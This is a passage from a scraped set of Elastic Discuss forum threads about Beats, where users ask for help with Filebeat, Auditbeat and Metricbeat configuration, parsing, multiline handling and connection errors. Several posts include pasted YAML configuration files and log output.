the PEM-format SSL certificate and key files. # These files are used to verify the identity of Kibana to Elasticsearch and are required when # xpack.security.http.ssl.client_authentication in Elasticsearch is set to required. #elasticsearch.ssl.certificate: /path/to/your/client.crt #elasticsearch.ssl.key: /path/to/your/client.key # Optional setting that enables you to specify a path to the PEM file for the certificate # authority for your Elasticsearch instance. \"kibana-7.6.2-linux-x86_64/config/kibana.yml\" 115L, 5269C Contents of filebeat.yml file ###################### Filebeat Configuration Example ######################### # This file is an example configuration file highlighting only the most common # options. The filebeat.reference.yml file from the same directory contains all the # supported options with more comments. You can use it as a reference. # # You can find the full configuration reference here: # https://www.elastic.co/guide/en/beats/filebeat/index.html # For more available modules and options, please see the filebeat.reference.yml sample # configuration file. #=========================== Filebeat inputs ============================= filebeat.inputs: # Each - is an input. Most options can be set at the input level, so # you can use different inputs for various configurations. # Below are the input specific configurations. - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /apache_access.log #- c:\\programdata\\elasticsearch\\logs\\* # Exclude lines. A list of regular expressions to match. It drops the lines that are # matching any regular expression from the list. #exclude_lines: ['^DBG'] # Include lines. A list of regular expressions to match. It exports the lines that are # matching any regular expression from the list. #include_lines: ['^ERR', '^WARN'] # Exclude files. A list of regular expressions to match. Filebeat drops the files that # are matching any regular expression from the list. By default, no files are dropped. #exclude_files: ['.gz$'] # Optional additional fields. These fields can be freely picked # to add additional information to the crawled log files for filtering #fields: # level: debug # review: 1 ### Multiline options # Multiline can be used for log messages spanning multiple lines. This is common # for Java Stack Traces or C-Line Continuation # The regexp Pattern that has to be matched. The example pattern matches all lines starting with [ #multiline.pattern: ^\\[ # Defines if the pattern set under pattern should be negated or not. Default is false. #multiline.negate: false # Match can be set to \"after\" or \"before\". It is used to define if lines should be append to a pattern # that was (not) matched before or after or as long as a pattern is not matched based on negate. # Note: After is the equivalent to previous and before is the equivalent to to next in Logstash #multiline.match: after #============================= Filebeat modules =============================== filebeat.config.modules: # Glob pattern for configuration loading path: ${path.config}/modules.d/*.yml # Set to true to enable config reloading reload.enabled: false # Period on which files under path should be checked for changes #reload.period: 10s #==================== Elasticsearch template setting ========================== setup.template.settings: index.number_of_shards: 1 #index.codec: best_compression #_source.enabled: false #================================ General ===================================== # The name of the shipper that publishes the network data. It can be used to group # all the transactions sent by a single shipper in the web interface. #name: # The tags of the shipper are included in their own field with each # transaction published. #tags: [\"service-X\", \"web-tier\"] # Optional fields that you can specify to add additional information to the # output. #fields: # env: staging #============================== Dashboards ===================================== # These settings control loading the sample dashboards to the Kibana index. Loading # the dashboards is disabled by default and can be enabled either by setting the # options here or by using the `setup` command. #setup.dashboards.enabled: false # The URL from where to download the dashboards archive. By default this URL # has a value which is computed based on the Beat name and version. For released # versions, this URL points to the dashboard archive on the artifacts.elastic.co # website. #setup.dashboards.url: #============================== Kibana ===================================== # Starting with Beats version 6.0.0, the dashboards are loaded via the Kibana API. # This requires a Kibana endpoint configuration. setup.kibana: # Kibana Host # Scheme and port can be left out and will be set to the default (http and 5601) # In case you specify and additional path, the scheme is required: http://localhost:5601/path # IPv6 addresses should always be defined as: https://[2001:db8::1]:5601 # host: \"localhost:5601\" # Kibana Space ID # ID of the Kibana Space into which the dashboards should be loaded. By default, # the Default Space will be used. #space.id: #============================= Elastic Cloud ================================== # These settings simplify using Filebeat with the Elastic Cloud (https://cloud.elastic.co/). # The cloud.id setting overwrites the `output.elasticsearch.hosts` and # `setup.kibana.host` options. # You can find the `cloud.id` in the Elastic Cloud web UI. #cloud.id: # The cloud.auth setting overwrites the `output.elasticsearch.username` and # `output.elasticsearch.password` settings. The format is `<user>:<pass>`. #cloud.auth: #================================ Outputs ===================================== # Configure what output to use when sending the data collected by the beat. #-------------------------- Elasticsearch output ------------------------------ output.elasticsearch: # Array of hosts to connect to. hosts: [\"js-168-192.jetstream-cloud.org:9200\"] # Protocol - either `http` (default) or `https`. #protocol: \"https\" # Authentication credentials - either API key or username/password. #api_key: \"id:api_key\" #username: \"elastic\" #password: \"changeme\" #----------------------------- Logstash output -------------------------------- #output.logstash: # The Logstash hosts #hosts: [\"localhost:5044\"] # Optional SSL. By default is off. # List of root certificates for HTTPS server verifications #ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] # Certificate for SSL client authentication #ssl.certificate: \"/etc/pki/client/cert.pem\" # Client Certificate Key #ssl.key: \"/etc/pki/client/cert.key\" #================================ Processors ===================================== # Configure processors to enhance or manipulate events generated by the beat. processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ - add_kubernetes_metadata: ~ #================================ Logging ===================================== # Sets log level. The default log level is info. # Available log levels are: error, warning, info, debug #logging.level: debug # At debug level, you can selectively enable logging only for some components. # To enable all selectors use [\"*\"]. Examples of other selectors are \"beat\", # \"publish\", \"service\". #logging.selectors: [\"*\"] #============================== X-Pack Monitoring =============================== # filebeat can export internal metrics to a central Elasticsearch monitoring # cluster. This requires xpack monitoring to be enabled in Elasticsearch. The # reporting is disabled by default. # Set to true to enable the monitoring reporter. #monitoring.enabled: false # Sets the UUID of the Elasticsearch cluster under which monitoring data for this # Filebeat instance will appear in the Stack Monitoring UI. If output.elasticsearch # is enabled, the UUID is derived from the Elasticsearch cluster referenced by output.elasticsearch. #monitoring.cluster_uuid: # Uncomment to send the metrics to Elasticsearch. Most settings from the # Elasticsearch output are accepted here as well. # Note that the settings should point to your Elasticsearch *monitoring* cluster. # Any setting that is not set is automatically inherited from the Elasticsearch # output configuration, so if you have the Elasticsearch output configured such # that it is pointing to your Elasticsearch monitoring cluster, you can simply # uncomment the following line. #monitoring.elasticsearch: #================================= Migration ================================== # This allows to enable 6.7 migration aliases #migration.6_to_7.enabled: true",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "0e106f68-8be9-4432-9efc-69f4653370ba",
    "url": "https://discuss.elastic.co/t/logstash-pipelines-for-parsing-questions-no-fileset-in-output/228519",
    "title": "Logstash Pipelines for Parsing Questions - No fileset in output",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "mgotechlock",
    "date": "April 17, 2020, 1:11pm April 17, 2020, 5:48pm April 17, 2020, 6:11pm April 17, 2020, 6:12pm April 17, 2020, 6:34pm April 17, 2020, 11:22pm April 20, 2020, 11:08am April 20, 2020, 11:13am April 20, 2020, 11:30am April 20, 2020, 11:45am April 20, 2020, 11:48am",
    "body": "I've tried following https://www.elastic.co/guide/en/logstash/7.6/logstash-config-for-filebeat-modules.html, and create logstash pipelines to parse the filebeat data. However, even the examples provided in that link don't seem to apply to me. The example config begins with filter { if [fileset][module] == \"system\" { if [fileset][name] == \"auth\" { Well, when I look at my filebeat logs and just dump them direct to stdout or a file, there is no \"fileset.module\", \"fileset.name\" or even \"fileset\" anywhere in the logs, so their example parsing config never matches. I don't understand if their recommended config is wrong or if there is something I need to do still to get my filebeat output to have \"fileset\" values. On the filebeat side, I have the system module enabled and the output going to logstash (on a custom port not 5044). Other than that, it is the default install of filebeat. Do you have any ideas on this? Thanks for any help you can give.",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "f1636909-a5f9-448c-8d0f-2bc495859ac0",
    "url": "https://discuss.elastic.co/t/filebat-signals/228670",
    "title": "Filebat signals",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "elastic_user1",
    "date": "April 20, 2020, 9:11am",
    "body": "I noticed following in my log when i could not connect to Logstash logs: NFO pipeline/output.go:93 Attempting to reconnect to backoff(async()) with 3 reconnect attempt(s) NFO [publisher] pipeline/retry.go:173 retryer: send wait signal to consumer NFO [publisher] pipeline/retry.go:175 done RROR pipeline/output.go:100 Failed to connect to backoff(async()): dial tcp connect: connection refused NFO pipeline/output.go:93 Attempting to reconnect to backoff(async()) with 4 reconnect attempt(s) NFO [publisher] pipeline/retry.go:196 retryer: send unwait-signal to consumer NFO [publisher] pipeline/retry.go:198 done NFO [publisher] pipeline/retry.go:173 retryer: send wait signal to consumer NFO [publisher] pipeline/retry.go:175 done RROR pipeline/output.go:100 Failed to connect to backoff(async()): dial connect: connection refused NFO pipeline/output.go:93 Attempting to reconnect to backoff(async()) with 5 reconnect attempt(s) NFO [publisher] pipeline/retry.go:196 retryer: send unwait-signal to consumer NFO [publisher] pipeline/retry.go:198 done NFO [publisher] pipeline/retry.go:173 retryer: send wait signal to consumer NFO [publisher] pipeline/retry.go:175 done //RROR pipeline/output.go:100 Failed to connect to backoff(async()): dial tcp connect: //connection refused //NFO pipeline/output.go:93 Attempting to reconnect to backoff(async()) with 6 reconnect //attempt(s) //NFO [publisher] pipeline/retry.go:196 retryer: send unwait-signal to consumer //NFO [publisher] pipeline/retry.go:198 done //NFO [publisher] pipeline/retry.go:173 retryer: send wait signal to consumer //NFO [publisher] pipeline/retry.go:175 done // I am confused, that right after an unwait signal is set, a wait signal is set at once. Why did unwait and wait signal happen? I don't know Go, so it is not clear to me. I examined the source code, i saw that wait and unwait signals link to SigHint() //func (c *eventConsumer) sigWait() { // c.wait.Store(true) // c.sigHint() //} //func (c *eventConsumer) sigUnWait() { // c.wait.Store(false) // c.sigHint() //func (c *eventConsumer) sigHint() { // send signal to unblock a consumer trying to publish events. // With flags being set atomically, multiple signals can be compressed into one // signal -> drop if queue is not empty // select { // case c.sig <- consumerSignal{tag: sigConsumerCheck}: // default: // } I am not sure what sigConsumerCheck contains in my situation. I debugged Filebeat and saw that the queue has ~2*max_bulk_setting (default 2048) (in my situation it was \"events\":{\"active\":4117}}), any more events doesn't add and it is ok. Events in the queue were kept until the connect was established. So I didn't understand what happened when i had unwait/wait signal.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b19ace88-7dbd-487c-8f14-f2aca86634bf",
    "url": "https://discuss.elastic.co/t/generatecustombeat-returns-error-for-missing-github-com-elastic-beats-v7/223785",
    "title": "GenerateCustomBeat returns error for missing github.com/elastic/beats/v7",
    "category": [
      "Beats",
      "Beats Developers"
    ],
    "author": "andrew-expanse",
    "date": "March 16, 2020, 3:16pm March 16, 2020, 3:43pm March 17, 2020, 2:49pm March 17, 2020, 6:49pm March 18, 2020, 4:23pm March 18, 2020, 4:48pm March 18, 2020, 4:50pm March 18, 2020, 4:50pm March 18, 2020, 5:00pm March 18, 2020, 5:33pm March 26, 2020, 8:56am March 29, 2020, 5:28pm March 29, 2020, 6:31pm March 30, 2020, 4:23pm April 14, 2020, 3:39pm April 15, 2020, 9:00pm April 16, 2020, 6:55am April 18, 2020, 9:41pm April 20, 2020, 8:53am",
    "body": "Hi all, I'm attempting to create a new custom beat but am hitting some errors when using the mage GenerateCustomBeat command. mage GenerateCustomBeat Enter the beat name [examplebeat]: testbeat Enter your github name [your-github-name]: andrewexpanse Enter the beat path [github.com/andrewexpanse/testbeat]: Enter your full name [Firstname Lastname]: Andrew Scott Enter the github.com/elastic/beats revision [master]: go: creating new go.mod: module github.com/andrewexpanse/testbeat go get github.com/elastic/beats/v7@master: module github.com/elastic/beats@master found (v7.0.0-alpha2.0.20200224095451-b0c600a28dbc+incompatible), but does not contain package github.com/elastic/beats/v7 Error: error while getting required beats version: running \"go get -d -u github.com/elastic/beats/v7@master\" failed with exit code 1 I did some searching but haven't seen any relevant topics yet. My dev environment is fresh after following these guidelines (https://www.elastic.co/guide/en/beats/devguide/current/beats-contributing.html#setting-up-dev-environment).",
    "website_area": "discuss",
    "replies": 19
  },
  {
    "id": "e715c4d4-1e34-4cea-9c9a-299fa150e3a9",
    "url": "https://discuss.elastic.co/t/failed-to-hash-executable-usr-sbin-agetty/228283",
    "title": "Failed to hash executable /usr/sbin/agetty",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "StefanDE",
    "date": "April 17, 2020, 6:23am April 20, 2020, 7:52am",
    "body": "On RHEL when starting auditbeat I get this errormessage via journalctl -u auditbeat: WARN [process] process/process.go:234 failed to hash executable /usr/sbin/agetty;5e46b406 (deleted) for PID 1140: failed to stat file /usr/sbin/agetty;5e46b406 (deleted): stat /usr/sbin/agetty;5e46b406 (deleted): no such file or directory Result is that SIEM module does not detect when I e.g. use \"whoami\" in bash. cat /usr/sbin/agetty gives me letters...so it exists. *edit: but... ps -ef|grep tty root 1140 1 0 2019 tty1 00:00:00 /sbin/agetty --noclear tty1 linux so do I need to change some config from /usr/sbin/agetty to /sbin/agetty ? I don't find \"agetty\" in auditbeat.yml. Where would I change this?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "59221390-17fe-4fe2-b61c-f4346fadc435",
    "url": "https://discuss.elastic.co/t/filebeat-netflow-error-bind-cannot-assign-requested-address/228479",
    "title": "Filebeat + Netflow error: \"bind: cannot assign requested address\"",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Minh_Ti_n_Tr_n",
    "date": "April 17, 2020, 8:55am April 17, 2020, 12:05pm April 17, 2020, 5:09pm April 20, 2020, 2:53am",
    "body": "Dear all, I config filebeat and netflow ( softflowd on pfsense ) but I got issue. Any solution for that? Thanks systemctl status filebeat -l ● filebeat.service - Filebeat sends log files to Logstash or directly to Elasticsearch. Loaded: loaded (/usr/lib/systemd/system/filebeat.service; enabled; vendor preset: disabled) Active: active (running) since Thu 2020-04-09 21:11:22 +07; 14s ago Docs: https://www.elastic.co/products/beats/filebeat Main PID: 10233 (filebeat) CGroup: /system.slice/filebeat.service └─10233 /usr/share/filebeat/bin/filebeat -e -c /etc/filebeat/filebeat.yml -path.home /usr/share/filebeat -path.config /etc/filebeat -path.data /var/lib/filebeat -path.logs /var/log/filebeat Apr 09 21:11:22 manager filebeat[10233]: 2020-04-09T21:11:22.230+0700 ERROR [netflow] netflow/input.go:164 Error running harvester: listen udp 192.168.1.23:2055: bind: cannot assign requested address Apr 09 21:11:23 manager filebeat[10233]: 2020-04-09T21:11:23.162+0700 INFO pipeline/output.go:95 Connecting to backoff(elasticsearch(https://192.168.1.17:9200)) Apr 09 21:11:23 manager filebeat[10233]: 2020-04-09T21:11:23.177+0700 INFO elasticsearch/client.go:753 Attempting to connect to Elasticsearch version 7.5.2 Apr 09 21:11:23 manager filebeat[10233]: 2020-04-09T21:11:23.215+0700 INFO template/load.go:169 Existing template will be overwritten, as overwrite is enabled. Apr 09 21:11:23 manager filebeat[10233]: 2020-04-09T21:11:23.216+0700 INFO template/load.go:109 Try loading template wazuh to Elasticsearch Apr 09 21:11:23 manager filebeat[10233]: 2020-04-09T21:11:23.259+0700 INFO template/load.go:101 template with name 'wazuh' loaded. Apr 09 21:11:23 manager filebeat[10233]: 2020-04-09T21:11:23.259+0700 INFO [index-management] idxmgmt/std.go:293 Loaded index template. Apr 09 21:11:23 manager filebeat[10233]: 2020-04-09T21:11:23.260+0700 INFO pipeline/output.go:105 Connection to backoff(elasticsearch(https://192.168.1.17:9200)) established Apr 09 21:11:32 manager filebeat[10233]: 2020-04-09T21:11:32.231+0700 INFO [netflow] netflow/input.go:153 Starting UDP input Apr 09 21:11:32 manager filebeat[10233]: 2020-04-09T21:11:32.231+0700 ERROR [netflow] netflow/input.go:164 Error running harvester: listen udp 192.168.1.23:2055: bind: cannot assign requested address My lsof: lsof -i | grep filebeat filebeat 10233 root 3u IPv4 14361498 0t0 TCP manager:51888->manager:wap-wsp (ESTABLISHED) filebeat 10233 root 6u IPv4 14362667 0t0 TCP manager:51890->manager:wap-wsp (ESTABLISHED) My filebeat.yml: # Wazuh - Filebeat configuration file filebeat.modules: - module: wazuh alerts: enabled: true archives: enabled: false #filebeat.config.inputs: # enabled: true # path: inputs.d/*.yml filebeat.config.modules: enabled: true path: /etc/filebeat/modules.d/*.yml setup.template.json.enabled: true setup.template.json.path: '/etc/filebeat/wazuh-template.json' setup.template.json.name: 'wazuh' setup.template.overwrite: true setup.ilm.enabled: false output.elasticsearch.hosts: ['https://192.168.1.17:9200'] output.elasticsearch.username: \"elastic\" output.elasticsearch.password: \"<password>\" output.elasticsearch.ssl.certificate_authorities: [\"/etc/elasticsearch/certs/ca.crt\"] output.elasticsearch.ssl.certificate: \"/etc/elasticsearch/certs/node-0.crt\" output.elasticsearch.ssl.key: \"/etc/elasticsearch/certs/node-0.key\" My netflow.yml: # Module: netflow # Docs: https://www.elastic.co/guide/en/beats/filebeat/7.5/filebeat-module-netflow.html - module: netflow log: enabled: true var: netflow_host: 192.168.1.23 netflow_port: 2055",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "0b23ea7b-6e96-41ba-a50c-dc8c5eee44b4",
    "url": "https://discuss.elastic.co/t/filebeat-eks-sidecar-container/228741",
    "title": "Filebeat EKS - sidecar container",
    "category": [
      "Beats"
    ],
    "author": "samaresh_kirtania",
    "date": "April 19, 2020, 3:38pm",
    "body": "Hi, I have a 3rd party image deployed in EKS, and it writes a lot of logs in different files. Now I have to push the logs from different files generated by the product into ES and viewed through Kibana I am using sidecar container with filebeat image so that it can collect the logs and push it to Elastic Search. In the EKS, fluentd daemonset has been configured, so if you put it in the console then the logs are pushed o ES. I designed the pipeline as below - Log Files -> FileBeat -> Console Output -> FLuentD -> ElasticSearch -> Kibana Its working and we are receiving the events in Kibana. But I have to modify the filebeat configuration to achieve the below items - In Filebeat configuration as I have used *.log so I have to either add a custom tag (may be with the filename) so that we can easily identify the event. If we add the custom tag and since the filebeat outputs to console will the tag be propagated to the ES. Please note that the fluentD and ES are enterprise installation and we can't change it. Remove the filebeat log/harvester logs from going to ES Thanks and Regards Samaresh",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "dd168cd8-863d-4d3e-92d0-95c8ca554b12",
    "url": "https://discuss.elastic.co/t/multiline-not-working-properly/228636",
    "title": "Multiline not working properly",
    "category": [
      "Beats"
    ],
    "author": "haneefh",
    "date": "April 18, 2020, 11:35am",
    "body": "I am using filebeats to send Atlassian catalina Logs. Below is a snippet filebeat configuration - /opt/atlassian/jira/logs/catalina.out fields: log_type: catalina log_application: atlassian_jira multiline.pattern: '^[0-9]{2}-[[:alpha:]]{3}-[0-9]{4}' multiline.negate: true multiline.match: after It works ok. But what I found was a particular entry was not completely captured In the below log entry , entry starting \"Exception in thread \"com.atlassian.mywork.client.reliability.DefaultUnreliableWorker:thread-426\" didnot appear in the elastic search. Instead the next log entry starting with data entry appeared. 17-Apr-2020 22:12:10.541 WARNING [http-nio-8080-exec-175] com.sun.jersey.spi.container.servlet.WebComponent.filterFormParameters A servlet request, to the URI https://jira.retailbusinessservices.com/rest/issueNav/1/issueNav/operations/tools, contains form parameters in the request body but the request body has been consumed by the servlet or a servlet filter accessing the request parameters. Only resource methods using @FormParam will work as expected. Resource methods consuming the request body by other means will not work as expected. Exception in thread \"com.atlassian.mywork.client.reliability.DefaultUnreliableWorker:thread-426\" java.lang.RuntimeException: com.atlassian.sal.api.net.ResponseException: 500 - at com.atlassian.mywork.client.reliability.DefaultUnreliableWorker$1$1.run(DefaultUnreliableWorker.java:81) at com.atlassian.sal.core.executor.ThreadLocalDelegateRunnable.run(ThreadLocalDelegateRunnable.java:34) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) Caused by: com.atlassian.sal.api.net.ResponseException: 500 - at com.atlassian.mywork.client.reliability.DefaultUnreliableWorker$2.handle(DefaultUnreliableWorker.java:121) at com.atlassian.mywork.client.reliability.DefaultUnreliableWorker$2.handle(DefaultUnreliableWorker.java:109) at com.atlassian.applinks.oauth.auth.OAuthApplinksResponseHandler$1.handle(OAuthApplinksResponseHandler.java:122) at com.atlassian.applinks.oauth.auth.OAuthApplinksResponseHandler.handle(OAuthApplinksResponseHandler.java:78) at com.atlassian.plugins.rest.module.jersey.JerseyRequest$2.handle(JerseyRequest.java:134) at com.atlassian.sal.core.net.HttpClientRequest.executeAndReturn(HttpClientRequest.java:102) at com.atlassian.plugins.rest.module.jersey.JerseyRequest.executeAndReturn(JerseyRequest.java:131) at com.atlassian.applinks.core.auth.ApplicationLinkRequestAdaptor.execute(ApplicationLinkRequestAdaptor.java:58) at com.atlassian.applinks.oauth.auth.ThreeLeggedOAuthRequest.execute(ThreeLeggedOAuthRequest.java:52) at com.atlassian.mywork.client.reliability.DefaultUnreliableWorker.send(DefaultUnreliableWorker.java:109) at com.atlassian.mywork.client.reliability.DefaultUnreliableWorker.access$200(DefaultUnreliableWorker.java:27) at com.atlassian.mywork.client.reliability.DefaultUnreliableWorker$1$1.run(DefaultUnreliableWorker.java:72) ... 4 more Exception in thread \"com.atlassian.mywork.client.reliability.DefaultUnreliableWorker:thread-427\" java.lang.RuntimeException: com.atlassian.sal.api.net.ResponseException: 500 - at com.atlassian.mywork.client.reliability.DefaultUnreliableWorker$1$1.run(DefaultUnreliableWorker.java:81)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b005a4af-1d46-42fc-8dc7-7e6c92cb0003",
    "url": "https://discuss.elastic.co/t/pull-request/228624",
    "title": "Pull Request",
    "category": [
      "Beats",
      "Beats Developers"
    ],
    "author": "saw.wn",
    "date": "April 18, 2020, 7:43am",
    "body": "Our team has created filebeat module. I request PR but elastic didn't reply anything. github.com/elastic/beats Filebeat Fortigate Module elastic:master ← kernellix:master opened 03:28AM - 16 Apr 20 UTC sawwn23 +11598 -0 Please guide me.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "69b1fe46-336e-472b-a2ca-8189872cbc9a",
    "url": "https://discuss.elastic.co/t/installing-beats-filebeat-auditbeat-etc-on-remote-host/228590",
    "title": "Installing Beats (Filebeat, Auditbeat, etc) on remote host",
    "category": [
      "Beats"
    ],
    "author": "mokotoy",
    "date": "April 17, 2020, 9:54pm",
    "body": "I have an ELK stack install on a RockNSM 2.5 machine with Elastic version 7.6 I have the server running and I want to install beats on other hosts in my network. I'm running into issues running the beats setup as it keeps rejecting the connection. My elastic server is 192.168.1.27 I have the following in my auditbeat.yml file on my host computer (Ubuntu server) output.elasticsearch: hosts: [\"192.168.1.27:9200\"] setup.kibana: host: \"192.168.1.27:5601\" To allow connection other than the default localhost, I changed my network.hosts in /etc/elasticsearch/elasticsearch.yml to network.host: 0.0.0.0 Additionally, I had to add the following lines: discovery.seed_hosts: [\"host1\"] cluster.initial_master_nodes: [\"node-1\"] note: “host1” = node.name (same as node.name in the yml file) and comment out the following: #discovery.type: single-node That worked. I tested it with netcat and succeeded. I ran into another problem with Kibana when I ran the sudo auditbeat setup I get: \"connection refused\" Overwriting ILM policy is disabled. Set `setup.ilm.overwrite:true` for enabling. Index setup finished. Loading dashboards (Kibana must be running and reachable) Exiting: error connecting to Kibana: fail to get the Kibana version: HTTP GET request to http://192.168.1.27:5601/api/status fails: fail to execute the HTTP GET request: Get http://192.168.1.27:5601/api/status: dial tcp 192.168.1.27:5601: connect: connection refused. Response: . I looked around online and found that I have to define server.host in /etc/kibana/kibana.yml to the Kibana’s IP address otherwise its default is localhost. I edited the kibana.yml and added server.host: 192.168.1.27 to look like below: server.port: 5601 server.name: \"RockNSM\" server.host: 192.168.1.27 server.defaultRoute: \"/app/kibana#/dashboard/6151e9d0-bf83-11e9-85bb-3b744f61312d\" elasticsearch.hosts: \"http://127.0.0.1:9200\" I ran sudo auditbeat setup on the host machine and voila! it worked! Overwriting ILM policy is disabled. Set `setup.ilm.overwrite:true` for enabling. Index setup finished. Loading dashboards (Kibana must be running and reachable) Loaded dashboards or at least it told me it worked… HOWEVER… Now I can’t connect to Kibana. Kibana is running, even when i restart it, everything is running. I go to the <Kibana's IP>/app/kibana#/ and I get a 503 error . I do a netstat -ano and I get a TIME_WAIT on the state of my connection I went back to the kibana.yml file and tried to change this elasticsearch.hosts: \"http://127.0.0.1:9200\" to this: elasticsearch.hosts: \"http://192.168.1.27:9200\" and that didn’t work… In the end, I changed the kibana.yml file back to normal and commented out the server.host server.port: 5601 server.name: \"RockNSM\" #server.host: 192.168.1.27 server.defaultRoute: \"/app/kibana#/dashboard/6151e9d0-bf83-11e9-85bb-3b744f61312d\" elasticsearch.hosts: \"http://127.0.0.1:9200\" I got my Kibana dashboard back but the my auditbeat host is gone. back to square 1! I’m once again out of things to try. looking for guidance. Just trying to deploy beats to hosts. I run into similar problems with other beats deployment. Thanks! -moki",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d765493c-1277-4ed5-af77-55bc85b3778e",
    "url": "https://discuss.elastic.co/t/exclude-lines-not-working-with-multiline/228411",
    "title": "Exclude lines not working with multiline",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "EliWallic",
    "date": "April 16, 2020, 9:48pm April 17, 2020, 6:48am April 17, 2020, 6:41pm April 18, 2020, 10:27am",
    "body": "Hello, I am trying to import some logs and configured it with an exclusion line and multiline. If I configure just the exclusion its working for this but if I also configure multiline in addition it seems to be ignored as the lines which should be excluded were imported. All is send to logstash. Config: filebeat.inputs: - type: log enabled: true paths: - C:/Logs/** exclude_lines: ['^[*]+$'] multiline.pattern: ^Command start multiline.negate: true multiline.match: after What I have: ********************** Command start time: 20200416214821 ********************** ********************** Start time: 20200416214819 Username: WORKGROUP\\SYSTEM RunAs User: WORKGROUP\\SYSTEM ********************** True ********************** ********************** Command start time: 20200416225643 ********************** ********************** Start time: 20200416225312 Username: WORKGROUP\\SYSTEM RunAs User: WORKGROUP\\SYSTEM ********************** False ********************** What I try: all ********************** should be exluded (not working) From 'Command start' till the next should be one event (working) Any idea whats wrong? Best Regards",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "e5b59b5e-53d9-41fa-96f7-c9678c22d07e",
    "url": "https://discuss.elastic.co/t/creating-new-filebeat-image-by-adding-custom-plugins/228329",
    "title": "Creating new filebeat image by adding custom plugins",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "jaks",
    "date": "April 16, 2020, 1:30pm April 17, 2020, 5:58pm",
    "body": "I am using filbeat 7.6.2 in Kubernetes. I need to add custom processors like beats-processor-fingerprint to this. I can find instructions to run filebeat in standalone mode with custom plugins, but not on where to add when it is packaged. To which directory the so file has to copied, when running in docker or kubernetes?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "60c29089-3be4-4af8-acab-e2d56eb8a058",
    "url": "https://discuss.elastic.co/t/extract-some-fields-from-json-and-assing-to-a-root/228289",
    "title": "Extract some fields from json and assing to a root",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "esseti",
    "date": "April 16, 2020, 9:41am April 17, 2020, 5:56pm",
    "body": "Hi all, i've in a log file a series of JSON that i want to parse not to extarct all the fields but only some. This is my log { \"call_type\": \"Example\", \"begin_time\": \"2020-04-15T15:05:32.982520+00:00\", \"call_size\": 30, \"caller_id\": \"123\", \"end_time\": \"2020-04-15T15:05:32.982744+00:00\", \"http_method\": \"POST\", \"request_id\": \"444\" } and what i want to have is inside a field of mine my_obj i want to keep the whole json inside message and extract some fields to go under my_obj.<field> such as caller_id { \"my_obj\" : { \"message\" : { \"call_type\": \"Example\", \"begin_time\": \"2020-04-15T15:05:32.982520+00:00\", \"call_size\": 30, \"caller_id\": \"123\", \"end_time\": \"2020-04-15T15:05:32.982744+00:00\", \"http_method\": \"POST\", \"request_id\": \"444\" }, \"request_id\": \"444\", \"caller_id\": \"123\" } } how can I do this? Is it feasible?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4efb38b2-c801-43f2-85ea-437a15ec22b0",
    "url": "https://discuss.elastic.co/t/aws-module-elb-tags-7-6-2/228531",
    "title": "AWS module - ELB Tags - 7.6.2",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "kungl",
    "date": "April 17, 2020, 2:01pm",
    "body": "Hi, I would like to get only those ELBs which belongs to specific tags from my AWS infrastructure (Stage=production). I can't find any example of this on ELB specific site, but I get \"tags_filter\" on ec2 documentation, so I try to use that. I read this in main site: \" Collecting tags for ec2 , cloudwatch , ebs and elb metricset is supported.\" Here is my config: - module: aws period: 60s metricsets: - elb tags_filter: - key: \"Stage\" value: \"production\" statistic: [\"Average\", \"Sum\"] Kibana hits: Metricbeat discover and send every ELB from my account. Cluster is on elastic cloud and every module 7.6.2 (es, kibana, metricbeat). Could someone help me, please?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b1f35246-fe40-4f3e-baed-8597b3229b38",
    "url": "https://discuss.elastic.co/t/using-timestamp-processor-fails/228348",
    "title": "Using timestamp processor fails",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "willyaranda_vonage",
    "date": "April 16, 2020, 2:57pm April 17, 2020, 4:59pm",
    "body": "Hi, I have logs that are JSON, and I'm trying to set the @timestamp field based on that. The format is: 2020-04-16 05:45:51,913 with timezone as 'America/Los_Angeles' I have set this configuration processors: - timestamp: field: event_date_pst timezone: 'America/Los_Angeles' layouts: - '2006-01-02 15:04:05,000' test: - '2020-04-16 05:45:51,913' - '2020-04-30 20:45:52,000' - '2020-12-31 20:45:52,080' but when testing it, fails: filebeat -e -d \"*\" test config 2020-04-16T07:47:17.381-0700 DEBUG [processor.timestamp] timestamp/timestamp.go:173 Failure parsing time field. {\"error\": \"failed parsing time field event_date_pst='2020-04-16 05:45:51,913'\", \"errorCauses\": [{\"error\": \"failed using layout [2006-01-02 15:04:05,000] cannot parse [913] as [,000]\"}]} The thing is that if I change the comma by a dot in the layout and the tests, it works, but it does not with the comma. Am I missing something? or it is because this? github.com/golang/go time: decimal comma not supported in fractional seconds opened 09:06PM - 19 Aug 13 UTC gopherbot by dmitri.m: What steps will reproduce the problem? If possible, include a link to a program on play.golang.org. The Go time package expects the... Thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "64754e88-eac4-4377-a604-c179b9b65183",
    "url": "https://discuss.elastic.co/t/filebeat-loading-index-template-json-not-working/228508",
